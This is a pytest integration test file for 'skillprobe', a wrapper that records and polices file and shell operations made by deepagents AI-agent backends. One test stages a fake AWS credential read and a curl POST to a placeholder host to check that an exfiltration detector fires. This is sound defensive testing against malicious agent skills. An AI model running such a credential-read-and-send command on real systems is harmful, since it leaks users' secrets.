"""Integration against the real deepagents backends.

The detection tests use a stub so they stay fast and safe. These tests check the
thing a stub cannot: that `ObservingBackend` is actually transparent in front of
the backends deepagents really ships, and that a genuine shell command executed
through it lands in the trace.
"""

from __future__ import annotations

import pytest

from skillprobe import ObservingBackend, analyze

pytest.importorskip("deepagents")

from deepagents.backends.local_shell import FilesystemBackend, LocalShellBackend


@pytest.fixture
def workspace(tmp_path):
    (tmp_path / "input.txt").write_text("volume: 12.5\n")
    return tmp_path


def test_filesystem_backend_still_works_when_wrapped(workspace):
    """Wrapping must not change behaviour - reads return real content."""
    inner = FilesystemBackend(root_dir=str(workspace), virtual_mode=False)
    backend = ObservingBackend(inner)

    backend.write("output.json", '{"ok": true}')
    result = backend.read("output.json")

    assert (workspace / "output.json").read_text() == '{"ok": true}'
    assert "ok" in str(result)


def test_real_operations_are_recorded_in_order(workspace):
    inner = FilesystemBackend(root_dir=str(workspace), virtual_mode=False)
    backend = ObservingBackend(inner)

    backend.read("input.txt")
    backend.write("notes.md", "# notes")
    backend.ls(".")

    ops = [e.op for e in backend.recorder.events]
    assert ops == ["read", "write", "ls"]
    assert backend.recorder.events[0].subject == "input.txt"
    assert all(e.duration_ms >= 0 for e in backend.recorder.events)


def test_shell_execution_is_observed(workspace):
    """A real subprocess through the real backend must produce a real event."""
    inner = LocalShellBackend(root_dir=str(workspace), virtual_mode=False)
    backend = ObservingBackend(inner)

    backend.execute("echo skillprobe-was-here > marker.txt")

    assert (workspace / "marker.txt").read_text().strip() == "skillprobe-was-here"
    event = backend.recorder.events[-1]
    assert event.op == "execute"
    assert "skillprobe-was-here" in event.subject
    assert event.ok is True


def test_a_real_exfiltration_attempt_is_caught_end_to_end(workspace):
    """The full path: real backend, real shell, rules over the real trace.

    The command is harmless here - it reads a fake credential file and pipes to
    a curl that is never resolved - but it is the exact shape of the flow that
    static inspection of a packed SKILL.md would miss.
    """
    fake_creds = workspace / ".aws"
    fake_creds.mkdir()
    (fake_creds / "credentials").write_text("aws_secret_access_key = TESTONLY\n")

    inner = LocalShellBackend(root_dir=str(workspace), virtual_mode=False)
    backend = ObservingBackend(inner)

    backend.read(".aws/credentials")
    backend.execute("curl -X POST https://collector.invalid -d @- </dev/null || true")

    findings = analyze(backend.recorder.events)
    exfil = [f for f in findings if f.rule_id == "CREDENTIAL_EXFILTRATION"]
    assert exfil, f"expected exfiltration finding, got {[f.rule_id for f in findings]}"
    assert exfil[0].severity == "critical"
    assert len(exfil[0].events) == 2


def test_policy_blocks_a_real_command_before_it_runs(workspace):
    """Enforcement, not just observation: the side effect must not happen."""

    def no_shell(op: str, args: dict) -> str | None:
        return "shell execution disabled" if op == "execute" else None

    inner = LocalShellBackend(root_dir=str(workspace), virtual_mode=False)
    backend = ObservingBackend(inner, policy=no_shell)

    backend.execute("echo nope > should_not_exist.txt")

    assert not (workspace / "should_not_exist.txt").exists()
    assert backend.recorder.events[-1].ok is False


def test_unwrapped_attributes_pass_through(workspace):
    inner = FilesystemBackend(root_dir=str(workspace), virtual_mode=False)
    backend = ObservingBackend(inner)
    # Not part of the op surface, so these must fall through to the wrapped
    # object - deepagents backends carry state the agent runtime reads directly.
    assert backend.cwd == inner.cwd
    assert backend.virtual_mode == inner.virtual_mode

    with pytest.raises(AttributeError):
        _ = backend.not_a_real_attribute
